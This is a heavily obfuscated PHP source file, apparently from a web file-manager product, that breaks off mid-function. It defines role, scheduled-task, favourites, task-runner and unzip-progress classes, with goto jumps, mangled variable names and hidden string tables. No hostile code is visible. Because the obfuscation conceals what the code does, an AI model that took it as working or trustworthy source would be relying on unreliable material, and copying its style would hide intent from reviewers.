<?php
 goto eİ—í·Ó‘«; aä–ÚŒº‘¨: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\162\157\154\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\x74\x68", "\x6c\141\142\x65\x6c", "\x64\151\x73\x70\x6c\141\x79", "\163\x79\x73\x74\145\155", "\144\145\x73\143", "\x69\x67\156\157\x72\x65\105\170\x74", "\151\147\x6e\x6f\162\x65\106\151\154\x65\123\151\172\145", "\141\x64\x6d\x69\156\151\163\x74\x72\141\x74\x6f\162", "\163\x6f\162\164"); public function listData($DğÈœ±Œ¾Ô = false, $b¹ùÔù“ƒ± = "\x73\157\162\x74", $EÂÕ‡É«ğ = false) { $eƒÁË„‡´ =& $_SERVER[ä°„ä°º]; $dì‚›­§¸ã = parent::listData($DğÈœ±Œ¾Ô, $b¹ùÔù“ƒ±, $EÂÕ‡É«ğ); if (!$DğÈœ±Œ¾Ô) { foreach ($dì‚›­§¸ã as $AÆÜ¬†ª => $B®½ò÷©·§) { if ($B®½ò÷©·§[$eƒÁË„‡´[1908]] == 1) { $dì‚›­§¸ã[$AÆÜ¬†ª][$eƒÁË„‡´[431]] = LNG($eƒÁË„‡´[2134]); } } } return $dì‚›­§¸ã; } public function update($aÚ¡ÇÎÑ¬Í, $E”âà·¾Ã) { goto dĞºÖ¹âå; dĞºÖ¹âå: $e©ÎÃÎŸØ =& $_SERVER[ä°„ä°º]; $CäÛ‡ßÚâÆ = parent::listData($aÚ¡ÇÎÑ¬Í); $AÉíÊœÀÙ… = $this->findByName($E”âà·¾Ã[$e©ÎÃÎŸØ[28]]); goto b·÷»ô­¬é; b·÷»ô­¬é: if (!$CäÛ‡ßÚâÆ || $AÉíÊœÀÙ… && $AÉíÊœÀÙ…[$e©ÎÃÎŸØ[393]] != $CäÛ‡ßÚâÆ[$e©ÎÃÎŸØ[393]]) { return !1; } if ($AÉíÊœÀÙ…[$e©ÎÃÎŸØ[1908]] == 1) { $E”âà·¾Ã = array($e©ÎÃÎŸØ[28] => $E”âà·¾Ã[$e©ÎÃÎŸØ[28]], $e©ÎÃÎŸØ[1742] => $E”âà·¾Ã[$e©ÎÃÎŸØ[1742]]); } $this->filterAuth($E”âà·¾Ã[$e©ÎÃÎŸØ[406]]); goto b¡”íàĞÈÅ; b¡”íàĞÈÅ: return parent::update($aÚ¡ÇÎÑ¬Í, $E”âà·¾Ã); goto bË”‡ãĞ§; bË”‡ãĞ§: } public function remove($b•í»¦ÌÌ) { $F·¬ï³‘á = parent::listData($b•í»¦ÌÌ); if (!$F·¬ï³‘á || $F·¬ï³‘á[$_SERVER[ä°„ä°º][1192]]) { return !1; } return parent::remove($b•í»¦ÌÌ); } public function add($AÄÓÔ¾±å) { goto FØÑ’Ü²á¬; a¯ËöˆŞ: $cÌŒ«á†‡¼ = array($A°¡Èëë‘¬[413] => $dŒç¥³æó, $A°¡Èëë‘¬[1726] => $A°¡Èëë‘¬[33], $A°¡Èëë‘¬[1722] => $A°¡Èëë‘¬[1730], $A°¡Èëë‘¬[2135] => 1, $A°¡Èëë‘¬[1725] => 0, $A°¡Èëë‘¬[2136] => 0, $A°¡Èëë‘¬[1724] => $this->getSort()); $AÄÓÔ¾±å = array_merge($cÌŒ«á†‡¼, $AÄÓÔ¾±å); $this->filterAuth($AÄÓÔ¾±å[$A°¡Èëë‘¬[406]]); goto e²œ’‡°; e²œ’‡°: return parent::insert($AÄÓÔ¾±å); goto b¶ÒÍ¬Íµ¼; FØÑ’Ü²á¬: $A°¡Èëë‘¬ =& $_SERVER[ä°„ä°º]; $dŒç¥³æó = $AÄÓÔ¾±å[$A°¡Èëë‘¬[28]]; if ($this->findByName($dŒç¥³æó)) { return !1; } goto a¯ËöˆŞ; b¶ÒÍ¬Íµ¼: } private function getSort() { $aˆ¯ñ­Ù¢— =& $_SERVER[ä°„ä°º]; $Aå˜¡Âºá„ = parent::listData(); $d÷ŠÌ·Š = array_to_keyvalue($Aå˜¡Âºá„, $aˆ¯ñ­Ù¢—[33], $aˆ¯ñ­Ù¢—[1743]); return empty($d÷ŠÌ·Š) ? 0 : max($d÷ŠÌ·Š) + 1; } private function filterAuth(&$f‚§êä¶Š) { $BÄŒ…É¾Ã =& $_SERVER[ä°„ä°º]; $eâ¯â¢‘¾ = array(); $Eø‰‰À–© = array_filter(explode($BÄŒ…É¾Ã[47], $f‚§êä¶Š)); foreach ($Eø‰‰À–© as $f‚§êä¶Š) { $bêŒæÛ‡Ä = explode($BÄŒ…É¾Ã[95], $f‚§êä¶Š); if ($bêŒæÛ‡Ä[0] == $BÄŒ…É¾Ã[2137] && $bêŒæÛ‡Ä[1] != $BÄŒ…É¾Ã[1111]) { $DÏŠÒ©õ = $bêŒæÛ‡Ä[0] . $BÄŒ…É¾Ã[95] . $bêŒæÛ‡Ä[1] . $BÄŒ…É¾Ã[2138]; if (!in_array($DÏŠÒ©õ, $Eø‰‰À–©)) { $eâ¯â¢‘¾[] = $DÏŠÒ©õ; } } $eâ¯â¢‘¾[] = $f‚§êä¶Š; } $f‚§êä¶Š = implode($BÄŒ…É¾Ã[47], $eâ¯â¢‘¾); } public function sort($BÌÅ‘Úå¯£, $d¦“æ©«¤) { return parent::update($BÌÅ‘Úå¯£, $d¦“æ©«¤); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\164\141\163\153\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\171\160\x65", "\x65\166\x65\x6e\x74", "\x74\151\155\145", "\144\x65\x73\x63", "\163\x79\x73\x74\145\155", "\x65\156\x61\142\x6c\x65", "\154\x61\163\164\122\165\156", "\x73\x6f\162\164"); public function listData($fæ´ÒÁğŸŒ = false, $Få¯Ù„’Ï¸ = "\163\x6f\x72\x74", $eÂ¯„…Ş«Ş = false) { return parent::listData($fæ´ÒÁğŸŒ, $Få¯Ù„’Ï¸, $eÂ¯„…Ş«Ş); } public function add($bèè‚Ç¾‘­) { $F³Ùº×µ‘ =& $_SERVER[ä°„ä°º]; $AöŞÁ†«¹å = $this->findByName($bèè‚Ç¾‘­[$F³Ùº×µ‘[28]]); if ($AöŞÁ†«¹å) { return !1; } $bèè‚Ç¾‘­[$F³Ùº×µ‘[1515]] = 0; $bèè‚Ç¾‘­[$F³Ùº×µ‘[1743]] = $this->getSort(); return parent::insert($bèè‚Ç¾‘­); } private function getSort() { $aëÅ”Ï®Ø =& $_SERVER[ä°„ä°º]; $A×›’šªº‹ = parent::listData(); $AÕ÷¤†ßÒØ = array_to_keyvalue($A×›’šªº‹, $aëÅ”Ï®Ø[33], $aëÅ”Ï®Ø[1743]); return empty($AÕ÷¤†ßÒØ) ? 0 : max($AÕ÷¤†ßÒØ) + 1; } public function update($F…ÑÏã«¦¤, $F ·ëâ‹Ã) { $BÛ˜œÀ‹Äİ =& $_SERVER[ä°„ä°º]; $CÍ°¿Ñ = $this->listData($F…ÑÏã«¦¤); $e©ÆÜƒÉ¯ = $this->findByName($F ·ëâ‹Ã[$BÛ˜œÀ‹Äİ[28]]); if (!$CÍ°¿Ñ || $e©ÆÜƒÉ¯ && $e©ÆÜƒÉ¯[$BÛ˜œÀ‹Äİ[393]] != $CÍ°¿Ñ[$BÛ˜œÀ‹Äİ[393]]) { return !1; } return parent::update($F…ÑÏã«¦¤, $F ·ëâ‹Ã); } public function remove($A”†Î¦‘¤¶, $CËê¶…éíç = false) { $Añøã¹ğÍô =& $_SERVER[ä°„ä°º]; $b•Æê©Ó Í = $this->listData($A”†Î¦‘¤¶); if (!$b•Æê©Ó Í) { return; } if (!$CËê¶…éíç && $b•Æê©Ó Í[$Añøã¹ğÍô[1192]] == $Añøã¹ğÍô[87]) { return !1; } return parent::remove($A”†Î¦‘¤¶); } public function enable($DæÒÓÆÙ•, $aë”ì³Ä±¡) { return $this->update($DæÒÓÆÙ•, array($_SERVER[ä°„ä°º][2129] => $aë”ì³Ä±¡)); } public function run($DÏÏ¯›âŸÆ) { return $this->update($DÏÏ¯›âŸÆ, array($_SERVER[ä°„ä°º][2139] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($A¹‚µ˜·ğÅ) { $Fï…ãÍøŠâ =& $_SERVER[ä°„ä°º]; return array($Fï…ãÍøŠâ[1822] => array(USER_ID, $Fï…ãÍøŠâ[2140])); } protected function listData() { $DöÉ¯©¸è =& $_SERVER[ä°„ä°º]; $dí‚µïÍ‡¿ = array($DöÉ¯©¸è[1542] => USER_ID, $DöÉ¯©¸è[463] => 0); $BéŠÁ¦×Õ = $DöÉ¯©¸è[2141]; $d–Çª¦‰ = $this->field($BéŠÁ¦×Õ)->where($dí‚µïÍ‡¿)->order($DöÉ¯©¸è[2142])->select(); return $d–Çª¦‰ ? $d–Çª¦‰ : array(); } protected function resetCache() { } protected function listView() { goto BÒğä¢ÅÂ¬; f¶Œƒê®¼: $AöÑÅĞ™ç = array($b×Ì¨òÌ®[410] => array($b×Ì¨òÌ®[411], $dÅ…šŒ×ºÌ)); $c¯ãäÈù»è = Model($b×Ì¨òÌ®[813])->listSource($AöÑÅĞ™ç, $B–…á’ˆŒ’); $c¯ãäÈù»è = array_merge($c¯ãäÈù»è[$b×Ì¨òÌ®[74]], $c¯ãäÈù»è[$b×Ì¨òÌ®[75]]); goto a¼Àº¶ÊŸ³; A¬öìÏ¢: $dÅ…šŒ×ºÌ = array_to_keyvalue($f‘¶í×©ôÄ, $b×Ì¨òÌ®[33], $b×Ì¨òÌ®[76]); if (!$dÅ…šŒ×ºÌ) { return $fÙµóÄ…­Ã; } $B–…á’ˆŒ’ = 2000; goto f¶Œƒê®¼; BÒğä¢ÅÂ¬: $b×Ì¨òÌ® =& $_SERVER[ä°„ä°º]; $fÙµóÄ…­Ã = $this->listData(); $f‘¶í×©ôÄ = array_filter_by_field($fÙµóÄ…­Ã, $b×Ì¨òÌ®[29], $b×Ì¨òÌ®[409]); goto A¬öìÏ¢; a¼Àº¶ÊŸ³: $c¯ãäÈù»è = array_to_keyvalue($c¯ãäÈù»è, $b×Ì¨òÌ®[395]); foreach ($fÙµóÄ…­Ã as $a¢·»Ó‰• => $C‘÷£ÆÙ¨¸) { $bĞ§œƒä†ë = $c¯ãäÈù»è[$C‘÷£ÆÙ¨¸[$b×Ì¨òÌ®[76]]]; $bĞ§œƒä†ë = $bĞ§œƒä†ë ? $bĞ§œƒä†ë : array(); $fÙµóÄ…­Ã[$a¢·»Ó‰•] = array_merge($bĞ§œƒä†ë, $C‘÷£ÆÙ¨¸); } return $fÙµóÄ…­Ã; goto aï¶Ï®ìÌ; aï¶Ï®ìÌ: } protected function addFav($Fº”Îá‚Ó¯, $f‘‘•’¯Ø = '', $F¸¹Ğ‰´† = "\x73\157\x75\162\143\x65") { goto f†³ÍŒÈè˜; E÷—»‚‰ËÅ: if (!$f‘‘•’¯Ø && $F¸¹Ğ‰´† == $bÈ¨ÌáĞè[409]) { $aÛ®Õ²´‡Ù = Model($bÈ¨ÌáĞè[1227])->where(array($bÈ¨ÌáĞè[410] => $Fº”Îá‚Ó¯))->find(); if (!$aÛ®Õ²´‡Ù) { return !1; } $f‘‘•’¯Ø = $aÛ®Õ²´‡Ù[$bÈ¨ÌáĞè[28]]; } $f‘‘•’¯Ø = $this->getAutoName($f‘‘•’¯Ø); $FÉĞƒÌšÅ¦ = array($bÈ¨ÌáĞè[1542] => USER_ID, $bÈ¨ÌáĞè[463] => 0, $bÈ¨ÌáĞè[413] => $f‘‘•’¯Ø, $bÈ¨ÌáĞè[414] => $Fº”Îá‚Ó¯, $bÈ¨ÌáĞè[415] => $F¸¹Ğ‰´†, $bÈ¨ÌáĞè[1724] => $dïŒÍ…Åñ” + 1); goto dà‹ï˜×§õ; dà‹ï˜×§õ: return $this->add($FÉĞƒÌšÅ¦); goto A‡ò‰…©‹¿; f†³ÍŒÈè˜: $bÈ¨ÌáĞè =& $_SERVER[ä°„ä°º]; $cá‘ùŒ™ƒ‘ = array($bÈ¨ÌáĞè[1542] => USER_ID, $bÈ¨ÌáĞè[463] => 0, $bÈ¨ÌáĞè[415] => $F¸¹Ğ‰´†, $bÈ¨ÌáĞè[414] => $Fº”Îá‚Ó¯); if ($this->where($cá‘ùŒ™ƒ‘)->find()) { return !1; } goto fÁß¦‚¶„; fÁß¦‚¶„: $cá‘ùŒ™ƒ‘ = array($bÈ¨ÌáĞè[1542] => USER_ID, $bÈ¨ÌáĞè[463] => 0); $dïŒÍ…Åñ” = $this->where($cá‘ùŒ™ƒ‘)->max($bÈ¨ÌáĞè[1743]); if (!$dïŒÍ…Åñ”) { $dïŒÍ…Åñ” = 0; } goto E÷—»‚‰ËÅ; A‡ò‰…©‹¿: } protected function remove($b¯õ×†¦¡³) { $AŞ•‘Ì›óÉ =& $_SERVER[ä°„ä°º]; $A³¡ÍÉàšÄ = array($AŞ•‘Ì›óÉ[1542] => USER_ID, $AŞ•‘Ì›óÉ[412] => $b¯õ×†¦¡³); return $this->where($A³¡ÍÉàšÄ)->delete(); } protected function removeByName($f¬¥øâ¤õ‡) { $f´½‹Ú½É‘ =& $_SERVER[ä°„ä°º]; $b›Ü•šâã„ = array($f´½‹Ú½É‘[1542] => USER_ID, $f´½‹Ú½É‘[413] => $f¬¥øâ¤õ‡, $f´½‹Ú½É‘[463] => 0); return $this->where($b›Ü•šâã„)->delete(); } protected function rename($B˜­âõãøê, $Dë¨¤—ø¸½) { $eé§¢£¤ì¨ =& $_SERVER[ä°„ä°º]; if ($B˜­âõãøê == $Dë¨¤—ø¸½) { return !1; } $fâ‰­”‘³ = $this->getAutoName($Dë¨¤—ø¸½); if ($Dë¨¤—ø¸½ != $fâ‰­”‘³) { return !1; } $aØ¿ÒÈ¡Øƒ = array($eé§¢£¤ì¨[1542] => USER_ID, $eé§¢£¤ì¨[463] => 0, $eé§¢£¤ì¨[28] => $B˜­âõãøê); return $this->where($aØ¿ÒÈ¡Øƒ)->save(array($eé§¢£¤ì¨[28] => $Dë¨¤—ø¸½)); } protected function resetSort($aÄó…ùÒˆ³) { $b’‹‡¬¹¤½ =& $_SERVER[ä°„ä°º]; $aÄó…ùÒˆ³ = is_array($aÄó…ùÒˆ³) ? $aÄó…ùÒˆ³ : array(); $f®¾öŸ’ÖĞ = array($b’‹‡¬¹¤½[1542] => USER_ID); for ($eÂ´÷¢‰ÓŸ = 0; $eÂ´÷¢‰ÓŸ < count($aÄó…ùÒˆ³); $eÂ´÷¢‰ÓŸ++) { $f®¾öŸ’ÖĞ[$b’‹‡¬¹¤½[412]] = $aÄó…ùÒˆ³[$eÂ´÷¢‰ÓŸ]; $this->where($f®¾öŸ’ÖĞ)->save(array($b’‹‡¬¹¤½[1724] => $eÂ´÷¢‰ÓŸ + 1)); } return !0; } protected function moveTop($Eç—ğ´„éå) { goto eåÌå¦ƒï…; cÃ¼Á±Œ¶: $cÀÑø†ç = $DáÕ·¯Ëé; $DáÕ·¯Ëé = array_remove_value($DáÕ·¯Ëé, $DİÁÃ›ò’Å[$fË¡è°Â[393]]); array_unshift($DáÕ·¯Ëé, $DİÁÃ›ò’Å[$fË¡è°Â[393]]); goto B­¦äâ; DÓÄ÷³ø‡„: if (!$DİÁÃ›ò’Å) { return; } $DáÕ·¯Ëé = $this->field($fË¡è°Â[393])->where($AåÁ¹‡¼ê)->order($fË¡è°Â[2142])->select(); $DáÕ·¯Ëé = array_to_keyvalue($DáÕ·¯Ëé, $fË¡è°Â[33], $fË¡è°Â[393]); goto cÃ¼Á±Œ¶; eåÌå¦ƒï…: $fË¡è°Â =& $_SERVER[ä°„ä°º]; $AåÁ¹‡¼ê = array($fË¡è°Â[1542] => USER_ID, $fË¡è°Â[463] => 0); $DİÁÃ›ò’Å = $this->where($AåÁ¹‡¼ê)->where(array($fË¡è°Â[28] => $Eç—ğ´„éå))->find(); goto DÓÄ÷³ø‡„; B­¦äâ: return $this->resetSort($DáÕ·¯Ëé); goto DÓ­×½¬ÏÔ; DÓ­×½¬ÏÔ: } protected function moveBottom($c¬Ç¯Ü†í) { $c¼ÊÌ¥»ç« =& $_SERVER[ä°„ä°º]; $d÷’‚ƒˆ×„ = array($c¼ÊÌ¥»ç«[1542] => USER_ID, $c¼ÊÌ¥»ç«[463] => 0); $e¨ÄŞ¿ğ = $this->where($d÷’‚ƒˆ×„)->max($c¼ÊÌ¥»ç«[1743]); $B·‘Êø¡¡ = array($c¼ÊÌ¥»ç«[1743] => $e¨ÄŞ¿ğ + 1); return $this->where($d÷’‚ƒˆ×„)->where(array($c¼ÊÌ¥»ç«[28] => $c¬Ç¯Ü†í))->save($B·‘Êø¡¡); } private function getAutoName($E… »ìá¨) { goto F“ºƒ¦²‰í; FİĞØ‹Å÷Û: $EèŸ ˆïÎ» = array_to_keyvalue($EèŸ ˆïÎ», $eñ—‹ªîÄ—[33], $eñ—‹ªîÄ—[28]); if (!$EèŸ ˆïÎ» || !in_array($E… »ìá¨, $EèŸ ˆïÎ»)) { return $E… »ìá¨; } for ($E´Š§á°äé = 0; $E´Š§á°äé < count($EèŸ ˆïÎ»); $E´Š§á°äé++) { if (!in_array($E… »ìá¨ . "\50{$E´Š§á°äé}\x29", $EèŸ ˆïÎ»)) { return $E… »ìá¨ . "\50{$E´Š§á°äé}\51"; } } goto e´ùÚº‹; e´ùÚº‹: return $E… »ìá¨ . "\x28{$E´Š§á°äé}\x29"; goto aÏãêÊÆ; F“ºƒ¦²‰í: $eñ—‹ªîÄ— =& $_SERVER[ä°„ä°º]; $B¿ÈÙ•¡³® = array($eñ—‹ªîÄ—[1542] => USER_ID, $eñ—‹ªîÄ—[463] => 0); $EèŸ ˆïÎ» = $this->field($eñ—‹ªîÄ—[28])->where($B¿ÈÙ•¡³®)->select(); goto FİĞØ‹Å÷Û; aÏãêÊÆ: } } goto AçÔˆ¨àóĞ; BÉò»ôÁ¾Ô: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($a„µ­‚´´, $Cø‰×‰·Ä» = 5.0) { if (!$a„µ­‚´´) { return; } $E¾õÇªÃ¬å = Cache::get($a„µ­‚´´); if (!$E¾õÇªÃ¬å || timeFloat() - floatVal($E¾õÇªÃ¬å) >= $Cø‰×‰·Ä») { Cache::set($a„µ­‚´´, timeFloat(), $Cø‰×‰·Ä» * 10); return !0; } return !1; } public static function timeLimitCall($eÖ‘Í³©â, $bô¥ÃÆÃì¬, $DîòŞ¬ğâ, $Fåšù¥ÏèÅ = 5.0) { goto D¯ñ„çèô; cšä¿ÔàÒ: Cache::set($e¼·ËŞë›¨, $EÙÅ±Ø”÷, 60); Cache::removeMemory($e¼·ËŞë›¨); write_log($e™¦›ÃØ†¤[1634] . $eÖ‘Í³©â . $e™¦›ÃØ†¤[68] . $bô¥ÃÆÃì¬, $e™¦›ÃØ†¤[1628]); goto Ašõ™«òª´; D¬”¥ÄŠë: if (is_array($EÙÅ±Ø”÷[$eÖ‘Í³©â])) { $f­‹±ã˜…[$e™¦›ÃØ†¤[1633]] = $EÙÅ±Ø”÷[$eÖ‘Í³©â][$e™¦›ÃØ†¤[1633]]; } if (is_array($EÙÅ±Ø”÷[$eÖ‘Í³©â])) { if (timeFloat() - $EÙÅ±Ø”÷[$eÖ‘Í³©â][$e™¦›ÃØ†¤[1632]] < $f­‹±ã˜…[$e™¦›ÃØ†¤[197]] * 0.3) { return; } $f­‹±ã˜…[$e™¦›ÃØ†¤[1633]] = $EÙÅ±Ø”÷[$eÖ‘Í³©â][$e™¦›ÃØ†¤[1633]]; } $EÙÅ±Ø”÷[$eÖ‘Í³©â] = $f­‹±ã˜…; goto cšä¿ÔàÒ; D¯ñ„çèô: $e™¦›ÃØ†¤ =& $_SERVER[ä°„ä°º]; if (!$eÖ‘Í³©â || !$bô¥ÃÆÃì¬) { return; } self::$asyncAdd = !0; goto bå™‡ÌßØğ; bå™‡ÌßØğ: $e¼·ËŞë›¨ = $e™¦›ÃØ†¤[1631]; $EÙÅ±Ø”÷ = Cache::get($e¼·ËŞë›¨, !0); $f­‹±ã˜… = array($e™¦›ÃØ†¤[1632] => timeFloat(), $e™¦›ÃØ†¤[1633] => timeFloat(), $e™¦›ÃØ†¤[262] => $bô¥ÃÆÃì¬, $e™¦›ÃØ†¤[1626] => $DîòŞ¬ğâ, $e™¦›ÃØ†¤[197] => $Fåšù¥ÏèÅ); goto D¬”¥ÄŠë; Ašõ™«òª´: } public static function timeLimitCallLoop() { goto d•÷ŞÔ‘œ; Cî„ÃªŠµË: if (!$AèìÛàÖÛ || count($AèìÛàÖÛ) <= 0) { return; } $C½…ÏÙ×ã‹ = !1; $b”Î²ĞŸÀ = timeFloat(); goto C…¸Á¤æÑ¾; fõ®¹ˆŠ°š: if (!$F‰±‘ˆ‚‡Â) { return Cache::remove($EŞŠ½“ëÛ¤); } Cache::set($EŞŠ½“ëÛ¤, $F‰±‘ˆ‚‡Â, 60); Cache::removeMemory($EŞŠ½“ëÛ¤); goto eÈÊ Ò§õÑ; d•÷ŞÔ‘œ: $eßÌÇÔ×Âé =& $_SERVER[ä°„ä°º]; $D²ìè––° = array($eßÌÇÔ×Âé[1635]); $Dç…î‰ğœ = in_array(strtolower(ACTION), $D²ìè––°); goto e„òÀ¿šÆé; C…¸Á¤æÑ¾: $F‰±‘ˆ‚‡Â = array(); foreach ($AèìÛàÖÛ as $e«î ¨ÌâÄ => $FˆŒİì±¿) { if ($b”Î²ĞŸÀ - $FˆŒİì±¿[$eßÌÇÔ×Âé[1633]] > $FˆŒİì±¿[$eßÌÇÔ×Âé[197]]) { $C½…ÏÙ×ã‹ = !0; try { Hook::apply($FˆŒİì±¿[$eßÌÇÔ×Âé[262]], $FˆŒİì±¿[$eßÌÇÔ×Âé[1626]]); write_log($eßÌÇÔ×Âé[1636] . $e«î ¨ÌâÄ . $eßÌÇÔ×Âé[68] . $FˆŒİì±¿[$eßÌÇÔ×Âé[262]] . $eßÌÇÔ×Âé[1637] . ACTION, $eßÌÇÔ×Âé[1628]); } catch (Exception $cçÙ˜ÊÀ†‡) { } continue; } $F‰±‘ˆ‚‡Â[$e«î ¨ÌâÄ] = $FˆŒİì±¿; } if (!$C½…ÏÙ×ã‹) { return; } goto fõ®¹ˆŠ°š; e„òÀ¿šÆé: if (!$Dç…î‰ğœ && !self::$asyncAdd) { return; } $EŞŠ½“ëÛ¤ = $eßÌÇÔ×Âé[1631]; $AèìÛàÖÛ = Cache::get($EŞŠ½“ëÛ¤, !0); goto Cî„ÃªŠµË; eÈÊ Ò§õÑ: } public static function finished($cŸ„Ò¥İ, $FÙÆÓ²Ö†÷) { $CĞä®à‚Â¼ =& $_SERVER[ä°„ä°º]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($CĞä®à‚Â¼[262] => $cŸ„Ò¥İ, $CĞä®à‚Â¼[1626] => $FÙÆÓ²Ö†÷); } private static function finishedRun() { $bö ±±•§ç =& $_SERVER[ä°„ä°º]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $e®Ã‡è¦¬) { try { Hook::apply($e®Ã‡è¦¬[$bö ±±•§ç[262]], $e®Ã‡è¦¬[$bö ±±•§ç[1626]]); } catch (Exception $c…‘ãÂ½¤É) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aùÁŞ‡°İŠ; cÅ§Èœ™—: Hook::bind($e‰ƒÕ¬–öœ[1110], array($this, $e‰ƒÕ¬–öœ[1640])); $fÜ¼ß²ÇîÄ =& $this->task; $fÜ¼ß²ÇîÄ[$e‰ƒÕ¬–öœ[1641]] = $e‰ƒÕ¬–öœ[1115]; goto f”ÜùÑÕÖ¿; f”ÜùÑÕÖ¿: if (!$fÜ¼ß²ÇîÄ[$e‰ƒÕ¬–öœ[1454]]) { $fÜ¼ß²ÇîÄ[$e‰ƒÕ¬–öœ[1454]] = LNG($e‰ƒÕ¬–öœ[1642]); } goto dØùº“º°; aùÁŞ‡°İŠ: $e‰ƒÕ¬–öœ =& $_SERVER[ä°„ä°º]; parent::startAfter(); Hook::bind($e‰ƒÕ¬–öœ[1638], array($this, $e‰ƒÕ¬–öœ[1639])); goto cÅ§Èœ™—; dØùº“º°: } protected function endAfter() { $eå‘°îÃË =& $_SERVER[ä°„ä°º]; parent::endAfter(); Hook::unbind($eå‘°îÃË[1638], array($this, $eå‘°îÃË[1639])); Hook::unbind($eå‘°îÃË[1110], array($this, $eå‘°îÃË[1640])); } public function updateAfter() { $Få´Ï‹¬Ñ =& $_SERVER[ä°„ä°º]; $E¼ŸÁİÑŞ² =& $this->task; if (!$E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1042]] || !$E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[746]]) { return; } if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1641]] == $Få´Ï‹¬Ñ[1115]) { $b˜¹Â„ìí… = 0; if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1597]]) { $b˜¹Â„ìí… = $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1598]] / $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1597]]; } $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]] = $b˜¹Â„ìí… * 0.3; } else { if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1641]] == $Få´Ï‹¬Ñ[311]) { $b˜¹Â„ìí… = $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1057]] / $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1042]]; $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]] = 0.3 + $b˜¹Â„ìí… * 0.4; } else { if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1641]] == $Få´Ï‹¬Ñ[107]) { $D„İï¢˜ñˆ = 0; if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1599]] == $Få´Ï‹¬Ñ[107]) { $D„İï¢˜ñˆ = $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1598]]; } $b˜¹Â„ìí… = ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1602]] + $D„İï¢˜ñˆ) / $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[746]]; $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]] = 0.3 + 0.4 + $b˜¹Â„ìí… * 0.3; } } } if ($E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]] > 0) { $c˜¶¢ØÏö = timeFloat() - $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[772]] - $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1555]]; $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1556]] = $c˜¶¢ØÏö * (1 - $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]]) / $E¼ŸÁİÑŞ²[$Få´Ï‹¬Ñ[1552]]; } } public function addFile($A¦òËİ‚®š) { goto a¸·µƒ²À¶; a¸·µƒ²À¶: $D½¿¶šù½› =& $_SERVER[ä°„ä°º]; $b¯ùâÑå¼ =& $this->task; $DùÔè­²áÏ = IO::info($A¦òËİ‚®š); goto b¥‘„á“¹¶; BŠ‘Şæ…í: $this->update(); goto aˆ‰¯ª±ÒÄ; b¥‘„á“¹¶: $b¯ùâÑå¼[$D½¿¶šù½›[1595]] = $DùÔè­²áÏ[$D½¿¶šù½›[28]]; $b¯ùâÑå¼[$D½¿¶šù½›[1597]] = $DùÔè­²áÏ[$D½¿¶šù½›[78]]; $b¯ùâÑå¼[$D½¿¶šù½›[1598]] = 0; goto a„‚äÀ£¡; fÃåÀğ¶¨î: $b¯ùâÑå¼[$D½¿¶šù½›[1042]] = 1; $AÂö‰ôãŸ‚ = 0; $b¯ùâÑå¼[$D½¿¶šù½›[1606]] = array($D½¿¶šù½›[1607] => $AÂö‰ôãŸ‚ + 1, $D½¿¶šù½›[413] => $DùÔè­²áÏ[$D½¿¶šù½›[28]], $D½¿¶šù½›[76] => $DùÔè­²áÏ[$D½¿¶šù½›[76]], $D½¿¶šù½›[500] => $DùÔè­²áÏ[$D½¿¶šù½›[500]] ? $DùÔè­²áÏ[$D½¿¶šù½›[500]] : $DùÔè­²áÏ[$D½¿¶šù½›[76]]); goto BŠ‘Şæ…í; a„‚äÀ£¡: $b¯ùâÑå¼[$D½¿¶šù½›[1044]] = $D½¿¶šù½›[1617]; $b¯ùâÑå¼[$D½¿¶šù½›[1599]] = $D½¿¶šù½›[1115]; $b¯ùâÑå¼[$D½¿¶šù½›[746]] = $DùÔè­²áÏ[$D½¿¶šù½›[78]]; goto fÃåÀğ¶¨î; aˆ‰¯ª±ÒÄ: } public function unzipAfter($c«äóÊ»áô) { goto CæÚ²Ÿ¿è; DŸµÂÖ™¼ò: $this->update(); self::log($eÆ¦‹ò‘Ÿ[1643] . json_encode(array($A“„°„œ», $EËèŸïÁ­­))); goto aÈ‹Ëá³ßÕ; bº…‘ø¿¨™: if ($EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[29]] == $eÆ¦‹ò‘Ÿ[193]) { $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1042]] = 1; } else { $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1042]] = $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[81]][$eÆ¦‹ò‘Ÿ[79]]; } $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1044]] = $eÆ¦‹ò‘Ÿ[33]; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1599]] = 0; 